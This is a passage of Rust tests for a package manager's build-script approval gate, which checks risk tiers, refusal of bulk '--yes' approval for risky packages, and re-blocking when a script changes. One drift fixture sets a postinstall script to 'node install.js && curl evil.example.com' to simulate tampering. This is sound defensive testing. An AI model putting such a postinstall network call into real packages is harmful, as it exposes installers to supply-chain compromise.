                "tempfile leaked: {s}"
            );
        }
    }

    // ── Schema versioning ───────────────────────────────────────────

    #[test]
    fn schema_version_is_at_least_1() {
        const _: () = assert!(SCHEMA_VERSION >= 1);
    }

    #[test]
    fn schema_version_bumped_for_static_tier() {
        // Phase 46 P2 Chunk 3: bumped to 2 when `static_tier` was
        // added to the blocked-entry JSON shape. If this test fails
        // because the version dropped, either a revert or a second
        // migration is needed — don't just bump the assertion.
        const _: () = assert!(SCHEMA_VERSION >= 2);
    }

    #[test]
    fn schema_version_bumped_for_version_diff() {
        // Phase 46 P7 Chunk 4: bumped to 3 when `version_diff` was
        // added to the blocked-entry JSON shape. If this test fails
        // because the version dropped, either a revert or a second
        // migration is needed — don't just bump the assertion.
        const _: () = assert!(SCHEMA_VERSION >= 3);
    }

    // ── Phase 46 P2 Chunk 3 — blocked_to_json + tier labels ─────────

    #[test]
    fn blocked_to_json_emits_static_tier_green() {
        use lpm_security::triage::StaticTier;
        let mut b = make_blocked("esbuild", "0.25.1");
        b.static_tier = Some(StaticTier::Green);
        let v = blocked_to_json(&b, &TrustedDependencies::default());
        assert_eq!(v["static_tier"], serde_json::json!("green"));
    }

    #[test]
    fn blocked_to_json_emits_static_tier_amber() {
        use lpm_security::triage::StaticTier;
        let mut b = make_blocked("playwright", "1.48.0");
        b.static_tier = Some(StaticTier::Amber);
        let v = blocked_to_json(&b, &TrustedDependencies::default());
        assert_eq!(v["static_tier"], serde_json::json!("amber"));
    }

    #[test]
    fn blocked_to_json_emits_static_tier_amber_llm() {
        use lpm_security::triage::StaticTier;
        let mut b = make_blocked("custom-tool", "1.0.0");
        b.static_tier = Some(StaticTier::AmberLlm);
        let v = blocked_to_json(&b, &TrustedDependencies::default());
        // Kebab-case wire contract (crate::triage's serde form).
        assert_eq!(v["static_tier"], serde_json::json!("amber-llm"));
    }

    #[test]
    fn blocked_to_json_emits_static_tier_red() {
        use lpm_security::triage::StaticTier;
        let mut b = make_blocked("malware", "0.0.1");
        b.static_tier = Some(StaticTier::Red);
        let v = blocked_to_json(&b, &TrustedDependencies::default());
        assert_eq!(v["static_tier"], serde_json::json!("red"));
    }

    #[test]
    fn blocked_to_json_emits_null_when_tier_absent() {
        // Pre-P2 persisted state leaves `static_tier` as None; the
        // field MUST appear as `null` (not be omitted) so agents can
        // distinguish "no tier known" from "field missing".
        let b = make_blocked("pre-p2", "1.0.0");
        assert!(b.static_tier.is_none());
        let v = blocked_to_json(&b, &TrustedDependencies::default());
        assert_eq!(v["static_tier"], serde_json::Value::Null);
        // And the key is present in the object (not omitted).
        assert!(
            v.as_object().unwrap().contains_key("static_tier"),
            "static_tier key must be present in the JSON object even \
             when the value is null — agents rely on presence to \
             distinguish null-value from schema-missing",
        );
    }

    #[test]
    fn tier_label_text_distinct_per_variant() {
        use lpm_security::triage::StaticTier;
        let labels = [
            tier_label_text(StaticTier::Green),
            tier_label_text(StaticTier::Amber),
            tier_label_text(StaticTier::AmberLlm),
            tier_label_text(StaticTier::Red),
        ];
        let mut seen = std::collections::HashSet::new();
        for lbl in labels {
            assert!(
                seen.insert(lbl),
                "tier labels must be distinct; duplicate: {lbl}"
            );
        }
    }

    #[test]
    fn tier_label_text_green_starts_with_green() {
        use lpm_security::triage::StaticTier;
        // Pin the user-facing text: green labels must start with
        // "green" so the terminal user sees a recognizable word
        // before any symbol or parenthetical.
        assert!(tier_label_text(StaticTier::Green).starts_with("green"));
        assert!(tier_label_text(StaticTier::Amber).starts_with("amber"));
        assert!(tier_label_text(StaticTier::AmberLlm).starts_with("amber"));
        assert!(tier_label_text(StaticTier::Red).starts_with("red"));
    }

    #[test]
    fn colored_tier_label_embeds_plain_text() {
        use lpm_security::triage::StaticTier;
        // The colored form must contain the plain text somewhere
        // (after stripping ANSI codes would be ideal, but substring
        // is enough since none of the plain-text forms collide with
        // ANSI escape sequence bytes).
        for tier in [
            StaticTier::Green,
            StaticTier::Amber,
            StaticTier::AmberLlm,
            StaticTier::Red,
        ] {
            let plain = tier_label_text(tier);
            let colored = colored_tier_label(tier);
            assert!(
                colored.contains(plain),
                "colored label for {tier:?} must contain the plain-text \
                 form; plain={plain:?} colored={colored:?}"
            );
        }
    }

    // ── Phase 46 P2 Chunk 4 — enforce_tiered_yes_gate ───────────────
    //
    // Pure tests for the refusal helper. End-to-end `--yes` tests
    // live in the `run()` suite below (same test file, later
    // section).

    #[test]
    fn yes_gate_empty_blocked_set_is_ok() {
        // Edge case: --yes against an empty effective blocked set
        // is a no-op today (approves nothing). The gate must not
        // refuse in this case.
        let blocked: Vec<BlockedPackage> = Vec::new();
        assert!(enforce_tiered_yes_gate(&blocked).is_ok());
    }

    #[test]
    fn yes_gate_allows_all_green() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![
            make_blocked_tiered("pkg-a", "1.0.0", StaticTier::Green),
            make_blocked_tiered("pkg-b", "2.0.0", StaticTier::Green),
        ];
        assert!(
            enforce_tiered_yes_gate(&blocked).is_ok(),
            "an all-green effective set must pass the --yes gate"
        );
    }

    #[test]
    fn yes_gate_allows_none_tiered_legacy_state() {
        // Pre-P2 persisted state carries static_tier = None. The
        // gate must pass `None` through to preserve existing --yes
        // muscle memory during a P1 → P2 upgrade; the next install
        // will recapture the state with real tiers.
        let blocked = vec![make_blocked("esbuild", "0.25.1")];
        assert!(blocked[0].static_tier.is_none());
        assert!(
            enforce_tiered_yes_gate(&blocked).is_ok(),
            "None static_tier (pre-P2 legacy state) must pass through \
             the --yes gate"
        );
    }

    #[test]
    fn yes_gate_allows_mixed_green_and_none() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![
            make_blocked_tiered("fresh-green", "1.0.0", StaticTier::Green),
            make_blocked("legacy", "1.0.0"),
        ];
        assert!(enforce_tiered_yes_gate(&blocked).is_ok());
    }

    #[test]
    fn yes_gate_refuses_single_amber() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![make_blocked_tiered(
            "playwright",
            "1.48.0",
            StaticTier::Amber,
        )];
        let err = enforce_tiered_yes_gate(&blocked).expect_err("amber must refuse");
        let msg = err.to_string();
        assert!(msg.contains("--yes refuses"), "got: {msg}");
        assert!(msg.contains("playwright@1.48.0"), "got: {msg}");
    }

    #[test]
    fn yes_gate_refuses_single_amber_llm() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![make_blocked_tiered(
            "mystery",
            "3.0.0",
            StaticTier::AmberLlm,
        )];
        let err = enforce_tiered_yes_gate(&blocked).expect_err("amber-llm must refuse");
        assert!(err.to_string().contains("--yes refuses"));
    }

    #[test]
    fn yes_gate_refuses_single_red() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![make_blocked_tiered("evil-pkg", "0.0.1", StaticTier::Red)];
        let err = enforce_tiered_yes_gate(&blocked).expect_err("red must refuse");
        assert!(err.to_string().contains("--yes refuses"));
    }

    #[test]
    fn yes_gate_refuses_mix_and_lists_only_refusals() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![
            make_blocked_tiered("safe-a", "1.0.0", StaticTier::Green),
            make_blocked_tiered("risky-a", "1.0.0", StaticTier::Amber),
            make_blocked("legacy", "2.0.0"),
            make_blocked_tiered("risky-b", "3.0.0", StaticTier::Red),
        ];
        let err = enforce_tiered_yes_gate(&blocked).expect_err("mix must refuse");
        let msg = err.to_string();

        // Refusals listed.
        assert!(msg.contains("risky-a@1.0.0"), "got: {msg}");
        assert!(msg.contains("risky-b@3.0.0"), "got: {msg}");
        // Count accurate (2 refusals, not 4).
        assert!(
            msg.contains("2 package(s)"),
            "count must reflect only refusals, not the whole set; got: {msg}"
        );
        // Green and None entries NOT listed as refusals.
        assert!(
            !msg.contains("safe-a@1.0.0"),
            "green must not be listed: {msg}"
        );
        assert!(
            !msg.contains("legacy@2.0.0"),
            "None-tier must not be listed: {msg}"
        );
    }

    #[test]
    fn yes_gate_error_message_redirects_to_interactive_path() {
        // The error must tell the user HOW to proceed; otherwise the
        // refusal is just a dead-end.
        use lpm_security::triage::StaticTier;
        let blocked = vec![make_blocked_tiered("x", "1.0.0", StaticTier::Amber)];
        let msg = enforce_tiered_yes_gate(&blocked)
            .expect_err("amber must refuse")
            .to_string();
        assert!(
            msg.contains("lpm approve-builds")
                && (msg.contains("interactive") || msg.contains("<pkg>") || msg.contains("--list")),
            "error must redirect to the interactive / single-pkg / list path; got: {msg}"
        );
    }

    // ── Phase 32 Phase 4 M6: end-to-end state-machine tests ─────────
    //
    // These exercise the full install → block → review → approve → build
    // pipeline by composing M3 (build_state capture) with M4 (approve-builds)
    // and re-running M3 to verify the suppression rule honors the new
    // approval. The actual `lpm build` script execution is out of scope
    // for unit tests (it spawns child processes); the strict gate that
    // M5 wires in is verified separately by the build.rs::tests::build_strict_gate_*
    // tests.
    //
    // The state machine cells we lock in:
    //   1. install ⇒ block (M3 alone)
    //   2. install ⇒ block ⇒ approve via --yes ⇒ install ⇒ silent
    //   3. install ⇒ block ⇒ approve specific pkg ⇒ install ⇒ silent
    //   4. install ⇒ block ⇒ approve ⇒ script body changes ⇒ install ⇒ re-blocked
    //   5. install with legacy array form ⇒ block ⇒ approve --yes ⇒ rich form
    //   6. install with no scriptable packages ⇒ no state, no warning

    use crate::build_state::{self, capture_blocked_set_after_install};
    use lpm_security::SecurityPolicy;
    use lpm_store::PackageStore;

    fn fake_store_with_pkg(
        store_root: &Path,
        name: &str,
        version: &str,
        scripts: &serde_json::Value,
    ) {
        let safe = name.replace('/', "+");
        let pkg_dir = store_root.join("v1").join(format!("{safe}@{version}"));
        fs::create_dir_all(&pkg_dir).unwrap();
        let pkg = serde_json::json!({
            "name": name,
            "version": version,
            "scripts": scripts,
        });
        fs::write(
            pkg_dir.join("package.json"),
            serde_json::to_string_pretty(&pkg).unwrap(),
        )
        .unwrap();
    }

    fn read_policy(project_dir: &Path) -> SecurityPolicy {
        SecurityPolicy::from_package_json(&project_dir.join("package.json"))
    }

    #[tokio::test]
    async fn e2e_install_block_review_approve_yes_then_install_is_silent() {
        // The canonical happy path: blocked → approve --yes → silent.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "tsc"}),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];

        // (1) First install ⇒ blocked, warning emitted
        let cap1 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap1.should_emit_warning);
        assert_eq!(cap1.state.blocked_packages.len(), 1);

        // (2) Approve via --yes
        run(project.path(), None, true, false, true).await.unwrap();
        let manifest = read_manifest(&project.path().join("package.json"));
        assert!(
            manifest["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object(),
            "yes mode must write the rich entry"
        );

        // (3) Re-run install with the new policy ⇒ silent
        let cap2 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(
            cap2.all_clear_banner || !cap2.should_emit_warning,
            "post-approval install should be silent or emit the all-clear banner"
        );
        assert!(cap2.state.blocked_packages.is_empty());

        // (4) A SECOND post-approval install should also be silent (no
        // repeated all-clear banner).
        let cap3 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(
            !cap3.should_emit_warning,
            "second post-approval install must be silent (no banner spam)"
        );
    }

    #[tokio::test]
    async fn e2e_install_block_approve_specific_then_install_is_silent() {
        // Same as the --yes flow but using `<pkg>` for a single approval.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "tsc"}),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];

        let cap1 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap1.should_emit_warning);

        // Approve esbuild specifically (json_output=true bypasses TTY confirm)
        run(project.path(), Some("esbuild"), false, false, true)
            .await
            .unwrap();

        let cap2 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap2.state.blocked_packages.is_empty());
    }

    #[tokio::test]
    async fn e2e_install_block_approve_then_script_drift_re_blocks() {
        // The CRITICAL invariant — script_hash binding actually catches
        // post-approval drift. Approve, then mutate the script in the
        // store, then re-run install: package re-blocked with binding_drift = true.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "tsc"}),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];

        let _ = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        run(project.path(), None, true, false, true).await.unwrap();

        // Sanity: post-approval install is silent
        let cap_post_approve = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap_post_approve.state.blocked_packages.is_empty());

        // Now mutate the script body in the store (simulates a tarball
        // swap or maintainer-pushed hotfix to the same version)
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js && curl evil.example.com"}),
        );

        // Re-run install ⇒ esbuild MUST be re-blocked with drift flag
        let cap_drift = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(
            cap_drift.should_emit_warning,
            "drift must re-emit the warning"
        );
        assert_eq!(cap_drift.state.blocked_packages.len(), 1);
        assert!(
            cap_drift.state.blocked_packages[0].binding_drift,
            "drifted package must be flagged with binding_drift = true"
        );
    }

    #[tokio::test]
    async fn e2e_install_with_legacy_array_form_does_not_break_install() {
        // Backwards-compat: a project with the pre-Phase-4 legacy array
        // form must still install. The strict gate sees LegacyNameOnly
        // for the listed package and treats it as approved (with a
        // deprecation warning at build time, but install is fine).
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_manifest(
            &project.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": ["esbuild"],
                },
            }),
        );
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "tsc"}),
        );

        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[(
                "esbuild".to_string(),
                "0.25.1".to_string(),
                Some("sha512-x".to_string()),
            )],
            &read_policy(project.path()),
        )
        .unwrap();

        // Legacy bare-name approval is enough to NOT block — install
        // proceeds silently. The deprecation warning is emitted at
        // `lpm build` time (M5), not here.
        assert!(cap.state.blocked_packages.is_empty());
        assert!(!cap.should_emit_warning);
    }

    #[tokio::test]
    async fn e2e_install_with_legacy_then_approve_yes_upgrades_to_rich() {
        // Migration path: project starts with the legacy array form, a
        // NEW package gets installed that needs approval, --yes upgrades
        // the manifest to the rich form AND preserves the existing legacy
        // entries.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_manifest(
            &project.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": ["sharp"],
                },
            }),
        );
        // sharp is approved (legacy), esbuild is NOT
        fake_store_with_pkg(
            store_root.path(),
            "sharp",
            "0.33.0",
            &serde_json::json!({"install": "node-gyp rebuild"}),
        );
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "tsc"}),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![
            ("sharp".to_string(), "0.33.0".to_string(), None),
            ("esbuild".to_string(), "0.25.1".to_string(), None),
        ];
        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        // Only esbuild is blocked (sharp is legacy-approved)
        assert_eq!(cap.state.blocked_packages.len(), 1);
        assert_eq!(cap.state.blocked_packages[0].name, "esbuild");

        // Bulk approve
        run(project.path(), None, true, false, true).await.unwrap();

        // Manifest is now Rich form with BOTH entries
        let manifest = read_manifest(&project.path().join("package.json"));
        let td = &manifest["lpm"]["trustedDependencies"];
        assert!(td.is_object(), "must be Rich form after first approval");
        let map = td.as_object().unwrap();
        assert!(map.contains_key("esbuild@0.25.1"), "new approval");
        assert!(
            map.contains_key("sharp@*"),
            "legacy entry preserved as `<name>@*`"
        );

        // Lenient lookup still finds sharp via the @* sentinel — install
        // continues to honor it for the legacy use case.
        let policy_after = read_policy(project.path());
        assert!(policy_after.can_run_scripts("sharp"));
    }

    // ── Phase 46 P2 Chunk 4 — --yes refusal e2e via run() ──────────

    #[tokio::test]
    async fn e2e_yes_refuses_when_any_entry_is_amber_and_manifest_stays_unchanged() {
        // End-to-end confirmation that the refusal gate wires through
        // to the `run()` entry point the CLI dispatches to. Amber
        // package (playwright install — a D18 downloader) MUST NOT
        // be approved by --yes.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "playwright",
            "1.48.0",
            &serde_json::json!({ "postinstall": "playwright install" }),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "playwright".to_string(),
            "1.48.0".to_string(),
            Some("sha512-x".to_string()),
        )];
        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert_eq!(cap.state.blocked_packages.len(), 1);
        assert_eq!(
            cap.state.blocked_packages[0].static_tier,
            Some(lpm_security::triage::StaticTier::Amber),
            "D18 `playwright install` must persist as Amber"
        );

        // Snapshot manifest before --yes so we can prove non-mutation.
        let manifest_before = read_manifest(&project.path().join("package.json"));

        // --yes must refuse.
        let err = run(project.path(), None, true, false, true)
            .await
            .expect_err("--yes against an amber blocked entry must error");
        let msg = err.to_string();
        assert!(msg.contains("--yes refuses"), "got: {msg}");
        assert!(msg.contains("playwright@1.48.0"), "got: {msg}");

        // Manifest MUST be byte-identical to before — the gate sits
        // before any write_back, so a refusal can't leak a partial
        // approval.
        let manifest_after = read_manifest(&project.path().join("package.json"));
        assert_eq!(
            manifest_before, manifest_after,
            "manifest must be unchanged after a --yes refusal"
        );
        // Specifically: trustedDependencies must not exist / be
        // empty. Either form is acceptable — some projects don't
        // have the key at all.
        assert!(
            manifest_after["lpm"]["trustedDependencies"]
                .as_object()
                .is_none()
                || manifest_after["lpm"]["trustedDependencies"]
                    .as_object()
                    .unwrap()
                    .is_empty(),
            "no trustedDependencies entry must be written on refusal"
        );
    }

    #[tokio::test]
    async fn e2e_yes_approves_all_green_and_does_not_refuse() {
        // Inverse contract: an all-green blocked set passes the
        // gate and --yes approves as before.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "typescript",
            "5.0.0",
            &serde_json::json!({ "postinstall": "tsc" }),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "typescript".to_string(),
            "5.0.0".to_string(),
            Some("sha512-t".to_string()),
        )];
        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert_eq!(
            cap.state.blocked_packages[0].static_tier,
            Some(lpm_security::triage::StaticTier::Green),
            "tsc body must persist as Green",
        );

        run(project.path(), None, true, false, true)
            .await
            .expect("all-green --yes must succeed");

        let manifest = read_manifest(&project.path().join("package.json"));
        assert!(
            manifest["lpm"]["trustedDependencies"]["typescript@5.0.0"].is_object(),
            "green package must be approved after --yes"
        );
    }

    #[tokio::test]
    async fn e2e_yes_passes_through_when_static_tier_is_none_legacy_state() {
        // Pre-P2 upgrade path: if the persisted BuildState predates
        // P2 (static_tier = None on every entry), --yes must still
        // work so upgrading LPM doesn't silently break existing
        // agent/CI flows. The next fresh install will recapture
        // tiers and from then on the gate applies.
        let project = tempdir().unwrap();
        write_default_manifest(project.path());
        // Craft a state file manually with static_tier = None,
        // bypassing the fresh capture path that would populate it.
        write_state(project.path(), vec![make_blocked("legacy-pkg", "1.0.0")]);

        run(project.path(), None, true, false, true)
            .await
            .expect("--yes against None-tiered (legacy) state must succeed");

        let manifest = read_manifest(&project.path().join("package.json"));
        assert!(
            manifest["lpm"]["trustedDependencies"]["legacy-pkg@1.0.0"].is_object(),
            "legacy-state entry must be approved on --yes pass-through",
        );
    }

    #[tokio::test]
    async fn e2e_install_with_no_scriptable_packages_no_state_no_warning() {
        // Defensive: a project that installs only packages with no install
        // scripts must not emit any banner.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "lodash",
            "4.17.21",
            &serde_json::json!({}),
        );

        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[("lodash".to_string(), "4.17.21".to_string(), None)],
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap.state.blocked_packages.is_empty());
        assert!(!cap.should_emit_warning);
        // State file is still written (so future installs share the same
        // empty fingerprint), but no warning fired.
        assert!(build_state::read_build_state(project.path()).is_some());
    }

    // ── Phase 4 audit Finding 2 — filter persisted state through current trust ──
    //
    // The persisted build-state.json is only refreshed by `lpm install`. If
    // the user approves a package via `lpm approve-builds` and then runs
    // `--list` or `--yes` again WITHOUT re-installing, the helper must
    // recompute "is this still blocked?" against the CURRENT manifest, not
    // against the stale state file. Pre-fix the state was treated as
    // authoritative and already-approved packages re-appeared in --list.

    // ── Effective blocked set helper (Phase 4 D-impl-2 surgical primitive) ──
    //
    // The pure helper that filters the persisted state through the current
    // trust. Tested directly because reaching it through the `run` function
    // pollutes stdout with TUI / JSON formatting and makes assertions noisy.

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** filter must REMOVE entries
    /// covered by a Strict match in the current trustedDependencies.
    #[test]
    fn compute_effective_blocked_set_removes_strict_matches() {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "2026-04-11T00:00:00Z".into(),
            blocked_packages: vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        };
        // esbuild approved strictly, sharp not.
        let mut map = std::collections::HashMap::new();
        map.insert(
            "esbuild@0.25.1".to_string(),
            TrustedDependencyBinding {
                integrity: Some("sha512-esbuild-integrity".into()),
                script_hash: Some("sha256-esbuild-hash".into()),
                ..Default::default()
            },
        );
        let trusted = TrustedDependencies::Rich(map);

        let effective = compute_effective_blocked_set(&state, &trusted);
        assert_eq!(effective.len(), 1);
        assert_eq!(effective[0].name, "sharp");
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** filter must REMOVE entries
    /// covered by a LegacyNameOnly match (the legacy bare-name approval is
    /// honored at install time, so it's not "blocked").
    #[test]
    fn compute_effective_blocked_set_removes_legacy_name_only_matches() {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "2026-04-11T00:00:00Z".into(),
            blocked_packages: vec![make_blocked("esbuild", "0.25.1")],
        };
        let trusted = TrustedDependencies::Legacy(vec!["esbuild".into()]);

        let effective = compute_effective_blocked_set(&state, &trusted);
        assert!(
            effective.is_empty(),
            "legacy bare-name approval must be honored as 'not blocked'"
        );
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** drifted entries must
    /// REMAIN in the effective blocked set even when the manifest has
    /// an entry for the same `name@version`. Drift is the whole reason
    /// we re-review.
    #[test]
    fn compute_effective_blocked_set_keeps_drifted_entries() {
        let mut blocked = make_blocked("esbuild", "0.25.1");
        blocked.script_hash = Some("sha256-NEW".to_string()); // drifted from stored
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "2026-04-11T00:00:00Z".into(),
            blocked_packages: vec![blocked],
        };
        let mut map = std::collections::HashMap::new();
        map.insert(
            "esbuild@0.25.1".to_string(),
            TrustedDependencyBinding {
                integrity: Some("sha512-esbuild-integrity".into()),
                script_hash: Some("sha256-OLD".into()),
                ..Default::default()
            },
        );
        let trusted = TrustedDependencies::Rich(map);

        let effective = compute_effective_blocked_set(&state, &trusted);
        assert_eq!(
            effective.len(),
            1,
            "drifted entry must STAY in the effective blocked set"
        );
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** unrelated entries are
    /// untouched (NotTrusted entries always stay blocked).
    #[test]
    fn compute_effective_blocked_set_keeps_not_trusted_entries() {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "2026-04-11T00:00:00Z".into(),
            blocked_packages: vec![make_blocked("esbuild", "0.25.1")],
        };
        let trusted = TrustedDependencies::default();
        let effective = compute_effective_blocked_set(&state, &trusted);
        assert_eq!(effective.len(), 1);
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-1 + D-impl-2 interaction):**
    /// after a legacy upgrade, an `<name>@*` preserve key must be
    /// honored by the effective-blocked-set filter. This is the
    /// composition test for both fixes.
    #[test]
    fn compute_effective_blocked_set_honors_at_star_preserve_key() {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "2026-04-11T00:00:00Z".into(),
            blocked_packages: vec![make_blocked("esbuild", "0.25.1")],
        };
        // Simulate post-upgrade state: legacy esbuild → esbuild@*
        let mut td = TrustedDependencies::Legacy(vec!["esbuild".into()]);
        td.upgrade_to_rich();

        let effective = compute_effective_blocked_set(&state, &td);
        assert!(
            effective.is_empty(),
            "after legacy upgrade, esbuild@* preserve key must satisfy the filter"
        );
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** `--list` must NOT include
    /// any package that the current `package.json::lpm.trustedDependencies`
    /// already covers strictly.
    #[tokio::test]
    async fn approve_builds_list_filters_already_approved_packages_from_current_trust() {
        let dir = tempdir().unwrap();
        // The state file says esbuild is blocked
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        // But the manifest already has a strict approval that matches the
        // exact integrity + script_hash from the state file.
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-esbuild-hash"
                        }
                    }
                }
            }),
        );

        // --list mode should print "nothing to approve" because esbuild
        // is already strict-approved. Pre-fix this would have shown
        // esbuild as blocked.
        run(dir.path(), None, false, true, true).await.unwrap();

        // Sanity: the state file is unchanged (--list is read-only)
        let state = build_state::read_build_state(dir.path()).unwrap();
        assert_eq!(state.blocked_packages.len(), 1);
        // The fix is in the rendering, not in the state file.
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** `--yes` must skip already-approved
    /// packages and not re-write them.
    #[tokio::test]
    async fn approve_builds_yes_skips_packages_already_strict_approved_in_manifest() {
        let dir = tempdir().unwrap();
        write_state(
            dir.path(),
            vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        );
        // esbuild is already strict-approved; sharp is not.
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-esbuild-hash"
                        }
                    }
                }
            }),
        );

        // --yes should approve ONLY sharp (esbuild is already strict-trusted)
        run(dir.path(), None, true, false, true).await.unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let map = after["lpm"]["trustedDependencies"]
            .as_object()
            .expect("Rich form");
        assert!(map.contains_key("esbuild@0.25.1"), "esbuild preserved");
        assert!(map.contains_key("sharp@0.33.0"), "sharp newly approved");
        // The esbuild binding must NOT have been re-written from the
        // state file (which would be a no-op overwrite, but we want the
        // helper to skip already-approved entries entirely).
        assert_eq!(
            map["esbuild@0.25.1"]["integrity"], "sha512-esbuild-integrity",
            "esbuild binding preserved unchanged"
        );
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** `<pkg>` must reject a package
    /// argument that points at an already-approved entry, with a clear
    /// "already approved" message rather than a useless re-approval.
    #[tokio::test]
    async fn approve_builds_specific_pkg_for_already_approved_is_a_no_op_with_message() {
        let dir = tempdir().unwrap();
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-esbuild-hash"
                        }
                    }
                }
            }),
        );

        // Asking to approve esbuild specifically should error with
